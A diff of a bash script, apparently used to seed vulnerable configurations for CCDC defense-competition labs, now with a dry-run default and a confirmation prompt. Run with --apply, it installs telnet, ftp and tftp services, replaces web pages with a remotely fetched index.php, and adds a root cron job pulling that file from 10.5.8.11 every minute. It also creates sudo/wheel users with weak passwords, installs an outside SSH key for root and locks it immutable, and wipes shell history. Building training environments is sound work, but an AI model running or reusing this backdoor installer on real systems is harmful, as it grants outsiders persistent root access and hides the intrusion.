@@ -1,200 +1,343 @@
 #!/usr/bin/env bash
+set -Eeuo pipefail
 
-# Paquetes normales
-base_pkgs=("nano" "curl" "git" "php" "httpd")
+# Script de laboratorio CCDC para sembrar configuraciones vulnerables de forma
+# controlada. Por seguridad, el modo por defecto solo muestra lo que haria.
 
-# Paquetes inseguros por OS
-case "$OS" in
-    debian|ubuntu|kali)
-        bad_pkgs=("telnet" "ftp" "tftp" "inetutils-talk")
-        ;;
-    centos|rhel|ol|fedora)
-        bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd" "talk")
-        ;;
-    *)
-        bad_pkgs=()
-        ;;
-esac
+DRY_RUN=1
+ASSUME_YES=0
+OS="unknown"
+ADMIN_GROUP=""
 
-paquetes=("${base_pkgs[@]}" "${bad_pkgs[@]}")
+WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
+INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
+ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
+CRON_LINE="${CRON_LINE:-* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php}"
 
-# Función para verificar si un paquete está instalado (Debian/Ubuntu/Kali)
-paquete_instalado_apt() {  
-    dpkg -l "$1" | grep -q '^ii'  
+usage() {
+    cat <<'EOF'
+Uso: redhavi-fedora [--apply] [--yes]
+
+Opciones:
+  --apply    Aplica cambios reales. Sin esta opcion solo imprime acciones.
+  --yes      No pide confirmacion interactiva cuando se usa --apply.
+  -h, --help Muestra esta ayuda.
+
+Variables opcionales:
+  WEB_REPO_URL   Repositorio PHP de prueba.
+  INDEX_URL      index.php usado para reemplazar paginas web.
+  ROOT_KEY_URL   Clave publica que se instalaria en /root/.ssh/authorized_keys.
+  CRON_LINE      Linea exacta que se agregaria al crontab de root.
+
+Advertencia:
+  Este script instala paquetes inseguros, modifica webroot, crea usuarios,
+  agrega una clave SSH para root, deja una tarea cron de laboratorio y borra
+  historial de shell al terminar.
+  Ejecutalo solo en maquinas autorizadas y descartables.
+EOF
 }
 
-# Función para verificar si un paquete está instalado (CentOS/RHEL/Oracle)
-paquete_instalado_yum() {
-    yum list installed "$1" 
+log() {
+    printf '[*] %s\n' "$*"
 }
 
-# Función para verificar si un paquete está instalado (Fedora)
-paquete_instalado_dnf() {
-    dnf list installed "$1"
+warn() {
+    printf '[!] %s\n' "$*" >&2
 }
 
-# Función para verificar si un paquete está instalado (Arch Linux)
-paquete_instalado_pacman() {
-    pacman -Qi "$1"
+die() {
+    printf '[ERROR] %s\n' "$*" >&2
+    exit 1
 }
 
-# Detectar el sistema operativo
-if [ -f /etc/os-release ]; then
-    . /etc/os-release
-    OS=$ID
-fi
+run() {
+    if [ "$DRY_RUN" -eq 1 ]; then
+        printf '[DRY-RUN] '
+        printf '%q ' "$@"
+        printf '\n'
+        return 0
+    fi
 
-echo "Sistema detectado: $OS"
+    "$@"
+}
 
-# Instalar paquetes basados en el sistema operativo
-for paquete in "${paquetes[@]}"; do
-    case $OS in
-        "debian"|"ubuntu"|"kali")
-            if ! paquete_instalado_apt "$paquete"; then
-                echo "Instalando el paquete $paquete (apt-get)..."
-                apt-get install -y "$paquete"
-            else
-                echo "Paquete ya instalado: $paquete"
-            fi
-            ;;
-        "centos"|"rhel"|"ol")
-            if ! paquete_instalado_yum "$paquete"; then
-                echo "Instalando el paquete $paquete (yum)..."
-                yum install -y "$paquete"
-            else
-                echo "Paquete ya instalado: $paquete"
-            fi
-            ;;
-        "fedora")
-            if ! paquete_instalado_dnf "$paquete"; then
-                echo "Instalando el paquete $paquete (dnf)..."
-                dnf install -y "$paquete"
-            else
-                echo "Paquete ya instalado: $paquete"
-            fi
-            ;;
-        "arch")
-            if ! paquete_instalado_pacman "$paquete"; then
-                echo "Instalando el paquete $paquete (pacman)..."
-                pacman -S --noconfirm "$paquete"
-            else
-                echo "Paquete ya instalado: $paquete"
-            fi
+confirm_apply() {
+    [ "$DRY_RUN" -eq 0 ] || return 0
+    [ "$ASSUME_YES" -eq 0 ] || return 0
+
+    warn "Vas a aplicar cambios vulnerables en este sistema."
+    printf 'Escribe LAB para continuar: '
+    read -r answer
+    [ "$answer" = "LAB" ] || die "Cancelado."
+}
+
+require_root() {
+    if [ "$DRY_RUN" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
+        die "Ejecuta como root para usar --apply."
+    fi
+}
+
+detect_os() {
+    if [ -n "${OS_OVERRIDE:-}" ]; then
+        OS="$OS_OVERRIDE"
+    elif [ -r /etc/os-release ]; then
+        # shellcheck disable=SC1091
+        . /etc/os-release
+        OS="${ID:-unknown}"
+    fi
+
+    case "$OS" in
+        debian|ubuntu|kali|centos|rhel|ol|fedora|arch)
             ;;
         *)
-            echo "OS no soportado para instalación automática de paquetes: $OS"
+            die "OS no soportado para instalacion automatica: $OS"
             ;;
     esac
-done
 
-##################################################
-#  WEB / PHP
-##################################################
+    log "Sistema detectado: $OS"
+}
 
-mkdir -p /var/www/simple-php-website
+package_installed() {
+    local pkg="$1"
 
-# Quitar inmutable antes de sobrescribir por si ya existía
-chattr -i /var/www/simple-php-website/index.php
-chattr -i /var/www/index.php
-chattr -i /var/www/html/index.php
+    case "$OS" in
+        debian|ubuntu|kali)
+            dpkg-query -W -f='${Status}' "$pkg" 2>/dev/null | grep -q 'install ok installed'
+            ;;
+        centos|rhel|ol|fedora)
+            rpm -q "$pkg" >/dev/null 2>&1
+            ;;
+        arch)
+            pacman -Qi "$pkg" >/dev/null 2>&1
+            ;;
+    esac
+}
 
-# Clonar el repositorio a /var/www (si ya existe, git se quejará y lo verás)
-git clone https://github.com/banago/simple-php-website.git /var/www/simple-php-website
+install_package() {
+    local pkg="$1"
 
-# Descargar index.php
-echo "Descargando index.php desde GitHub..."
-curl -o /var/www/simple-php-website/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
-curl -o /var/www/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
-curl -o /var/www/html/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
-
-# Aplicar el atributo inmutable al archivo index.php principal
-chattr +i /var/www/simple-php-website/index.php
-
-# Añadir tarea a crontab (root)
-CRON_LINE="* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php"
-
-echo "Configurando crontab..."
-TMP_CRON="/tmp/cron.$$"
-crontab -l > "$TMP_CRON" 2>/dev/null || touch "$TMP_CRON"
-grep -F "$CRON_LINE" "$TMP_CRON" || echo "$CRON_LINE" >> "$TMP_CRON"
-crontab "$TMP_CRON"
-rm -f "$TMP_CRON"
-
-# Iniciar y habilitar httpd
-echo "Iniciando y habilitando httpd..."
-systemctl start httpd
-systemctl enable httpd
-
-##################################################
-#  USUARIOS Y GRUPO ADMIN (sudo / wheel)
-##################################################
-
-echo "Detectando grupo de administradores (sudo/wheel)..."
-if getent group sudo; then
-    ADMIN_GROUP="sudo"
-elif getent group wheel; then
-    ADMIN_GROUP="wheel"
-else
-    echo "No existe sudo ni wheel, creando grupo sudo..."
-    groupadd sudo
-    ADMIN_GROUP="sudo"
-fi
-
-echo "Grupo de admins: $ADMIN_GROUP"
-
-# Usuario ccdc
-echo "Revisando usuario ccdc..."
-if id ccdc; then
-    echo "Usuario ccdc ya existe."
-else
-    echo "Creando usuario ccdc..."
-    if useradd -m -G "$ADMIN_GROUP" ccdc; then
-        echo "ccdc:ccdc" | chpasswd
-        passwd --expire ccdc
-        echo "Usuario ccdc creado correctamente."
-    else
-        echo "ERROR creando usuario ccdc."
+    if package_installed "$pkg"; then
+        log "Paquete ya instalado: $pkg"
+        return 0
     fi
-fi
 
-# Usuario splunk
-echo "Revisando usuario splunk..."
-if id splunk; then
-    echo "Usuario splunk ya existe."
-else
-    echo "Creando usuario splunk..."
-    if useradd -M -G "$ADMIN_GROUP" splunk; then
-        echo "splunk:ass" | chpasswd
-        echo "Usuario splunk creado correctamente."
+    case "$OS" in
+        debian|ubuntu|kali)
+            run apt-get install -y "$pkg"
+            ;;
+        centos|rhel|ol)
+            run yum install -y "$pkg"
+            ;;
+        fedora)
+            run dnf install -y "$pkg"
+            ;;
+        arch)
+            run pacman -S --noconfirm "$pkg"
+            ;;
+    esac
+}
+
+install_packages() {
+    local base_pkgs=("nano" "curl" "git" "php" "httpd")
+    local bad_pkgs=()
+    local paquetes=()
+    local paquete
+
+    case "$OS" in
+        debian|ubuntu|kali)
+            bad_pkgs=("telnet" "ftp" "tftp")
+            ;;
+        centos|rhel|ol)
+            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
+            ;;
+        fedora)
+            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
+            ;;
+        arch)
+            bad_pkgs=("inetutils" "tftp-hpa")
+            ;;
+    esac
+
+    paquetes=("${base_pkgs[@]}" "${bad_pkgs[@]}")
+
+    for paquete in "${paquetes[@]}"; do
+        install_package "$paquete"
+    done
+}
+
+set_immutable() {
+    local mode="$1"
+    local path="$2"
+
+    command -v chattr >/dev/null 2>&1 || {
+        warn "chattr no esta disponible; omitiendo $mode $path"
+        return 0
+    }
+
+    if [ "$DRY_RUN" -eq 1 ] || [ -e "$path" ]; then
+        run chattr "$mode" "$path"
     else
-        echo "ERROR creando usuario splunk."
+        warn "No existe $path; omitiendo chattr $mode"
     fi
-fi
+}
 
-echo "Usuarios configurados. Grupo admin usado: $ADMIN_GROUP"
+setup_web() {
+    log "Configurando contenido web de laboratorio..."
 
-##################################################
-#  SSH KEY ROOT
-##################################################
+    run mkdir -p /var/www/simple-php-website /var/www/html
 
-echo "Configurando clave SSH para root..."
-URL_CLAVE="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
+    set_immutable -i /var/www/simple-php-website/index.php
+    set_immutable -i /var/www/index.php
+    set_immutable -i /var/www/html/index.php
 
-mkdir -p /root/.ssh
+    if [ "$DRY_RUN" -eq 1 ] || [ ! -d /var/www/simple-php-website/.git ]; then
+        run git clone "$WEB_REPO_URL" /var/www/simple-php-website
+    else
+        run git -C /var/www/simple-php-website pull --ff-only
+    fi
 
-# Quitar inmutable antes de sobrescribir
-chattr -i /root/.ssh/authorized_keys
+    run curl -fsSL -o /var/www/simple-php-website/index.php "$INDEX_URL"
+    run curl -fsSL -o /var/www/index.php "$INDEX_URL"
+    run curl -fsSL -o /var/www/html/index.php "$INDEX_URL"
 
-curl -o /root/.ssh/authorized_keys "$URL_CLAVE"
-chmod 600 /root/.ssh/authorized_keys
+    set_immutable +i /var/www/simple-php-website/index.php
+}
 
-chattr +i /root/.ssh/authorized_keys
+setup_cron() {
+    local tmp_cron
 
-echo "Clave SSH pública instalada para el usuario root."
+    log "Configurando crontab de laboratorio..."
+    tmp_cron="$(mktemp)"
 
-sleep 1 
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Se agregaria al crontab de root: $CRON_LINE"
+        rm -f "$tmp_cron"
+        return 0
+    fi
 
-history -c
-history -w
+    crontab -l >"$tmp_cron" 2>/dev/null || true
+    grep -Fqx "$CRON_LINE" "$tmp_cron" || printf '%s\n' "$CRON_LINE" >>"$tmp_cron"
+    crontab "$tmp_cron"
+    rm -f "$tmp_cron"
+}
 
-echo "Historial borrado"
+enable_httpd() {
+    log "Iniciando y habilitando httpd..."
+    run systemctl start httpd
+    run systemctl enable httpd
+}
+
+detect_admin_group() {
+    log "Detectando grupo de administradores..."
+
+    if getent group sudo >/dev/null 2>&1; then
+        ADMIN_GROUP="sudo"
+    elif getent group wheel >/dev/null 2>&1; then
+        ADMIN_GROUP="wheel"
+    else
+        ADMIN_GROUP="sudo"
+        run groupadd "$ADMIN_GROUP"
+    fi
+
+    log "Grupo admin usado: $ADMIN_GROUP"
+}
+
+set_password() {
+    local user="$1"
+    local password="$2"
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        printf '[DRY-RUN] chpasswd for user %q\n' "$user"
+        return 0
+    fi
+
+    printf '%s:%s\n' "$user" "$password" | chpasswd
+}
+
+ensure_user() {
+    local user="$1"
+    local password="$2"
+    local home_flag="$3"
+    local expire_password="$4"
+
+    if id "$user" >/dev/null 2>&1; then
+        log "Usuario $user ya existe."
+        return 0
+    fi
+
+    log "Creando usuario $user..."
+    run useradd "$home_flag" -G "$ADMIN_GROUP" "$user"
+    set_password "$user" "$password"
+
+    if [ "$expire_password" = "yes" ]; then
+        run passwd --expire "$user"
+    fi
+}
+
+setup_users() {
+    detect_admin_group
+    ensure_user ccdc ccdc -m yes
+    ensure_user splunk ass -M no
+}
+
+setup_root_ssh_key() {
+    log "Configurando clave SSH para root..."
+
+    run mkdir -p /root/.ssh
+    set_immutable -i /root/.ssh/authorized_keys
+
+    run curl -fsSL -o /root/.ssh/authorized_keys "$ROOT_KEY_URL"
+    run chmod 600 /root/.ssh/authorized_keys
+    set_immutable +i /root/.ssh/authorized_keys
+}
+
+clear_shell_history() {
+    log "Borrando historial de shell..."
+
+    run history -c
+    run history -w
+}
+
+parse_args() {
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            --apply)
+                DRY_RUN=0
+                ;;
+            --yes)
+                ASSUME_YES=1
+                ;;
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                die "Opcion no reconocida: $1"
+                ;;
+        esac
+        shift
+    done
+}
+
+main() {
+    parse_args "$@"
+    detect_os
+    require_root
+    confirm_apply
+
+    install_packages
+    setup_web
+    setup_cron
+    enable_httpd
+    setup_users
+    setup_root_ssh_key
+    clear_shell_history
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Dry-run terminado. Usa --apply para aplicar en una maquina de laboratorio autorizada."
+    else
+        log "Cambios aplicados."
+    fi
+}
+
+main "$@"
